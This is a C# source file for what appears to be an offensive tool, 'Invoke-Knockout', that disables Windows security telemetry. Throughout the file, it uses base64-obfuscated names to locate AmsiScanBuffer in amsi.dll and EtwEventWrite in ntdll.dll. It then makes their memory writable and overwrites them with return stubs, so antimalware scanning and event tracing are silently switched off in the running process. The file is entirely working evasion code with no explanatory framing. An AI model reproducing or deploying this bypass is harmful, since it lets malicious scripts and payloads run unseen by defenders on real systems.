using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class AMSI
    {
        //patch list
        static byte[] etw_patch_x64 = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
        static byte[] etw_patch_x86 = new byte[] { 0x33, 0xc0, 0xc2, 0x14, 0x00 };
        static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        private static string Decode(string b64_encoded)
        {
            return System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(b64_encoded));
        }
        private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;
            return is64Bit;
        }

        public static IntPtr AMSIaddr()
        {
            string dll = Decode("YW1zaS5kbGw="); //amsi dll
            string func = Decode("QW1zaVNjYW5CdWZmZXI="); //asb function
            var modules = Process.GetCurrentProcess().Modules;
            var hAmsi = IntPtr.Zero;

            foreach (ProcessModule module in modules)
            {
                if (module.ModuleName.Equals(dll))
                {
                    hAmsi = module.BaseAddress;
                    break;
                }
            }
            return Win32.GetProcAddress(hAmsi, func);
        }

        public static IntPtr ETWaddr()
        {
            string dll = Decode("bnRkbGwuZGxs"); //ntdll dll
            string func = Decode("RXR3RXZlbnRXcml0ZQ=="); //EEW function
            var modules = Process.GetCurrentProcess().Modules;
            var hETW = IntPtr.Zero;

            foreach (ProcessModule module in modules)
            {
                if (module.ModuleName.Equals(dll))
                {
                    hETW = module.BaseAddress;
                    break;
                }
            }
            return Win32.GetProcAddress(hETW, func);
    }

        private static void PatchAmsi(byte[] patch)
        {
            string dll = Decode("YW1zaS5kbGw="); //amsi dll
            string func = Decode("QW1zaVNjYW5CdWZmZXI="); //asb function
            PatchMem(patch, dll, func, AMSIaddr());
        }

        private static void PatchEtw(byte[] patch)
        {
            string dll = Decode("bnRkbGwuZGxs"); //ntdll dll
            string func = Decode("RXR3RXZlbnRXcml0ZQ=="); //EEW function
            PatchMem(patch, dll, func, ETWaddr());
        }

        private static void PatchMem(byte[] patch, string library, string function, IntPtr offset)
        {
            try
            {
                uint newProtect;
                uint oldProtect;
                IntPtr libPtr = Win32.LoadLibrary(library);
                IntPtr functPtr = Win32.GetProcAddress(libPtr, function);
                Win32.VirtualProtect(functPtr, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, functPtr, patch.Length);
                Win32.VirtualProtect(functPtr, (UIntPtr)patch.Length, oldProtect, out newProtect);
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] ERROR: {0}", e.Message);
                Console.WriteLine("[!] ERROR: {0}", e.InnerException);
            }
        }

        public static void Bypass()
        {
            if (is64Bit())
            {
                Console.WriteLine("[*] Invoke-Knockout by @LongWayHomie");
                Console.WriteLine("[*] Sleep tight, AMSI...");
                PatchAmsi(x64);
                Console.WriteLine("[*] Sleep tight, ETW...");
                PatchEtw(etw_patch_x64);
                Console.WriteLine("[*] Done.");
            }
            else
            {
                Console.WriteLine("[*] Invoke-Knockout by @LongWayHomie");
                Console.WriteLine("[*] Sleep tight, AMSI...");
                PatchAmsi(x86);
                Console.WriteLine("[*] Sleep tight, ETW...");
                PatchEtw(etw_patch_x86);
                Console.WriteLine("[*] Done.");
            }
        }
 }

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); 
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwsize, uint flNewProtect, out uint lpflOldProtect); 
}
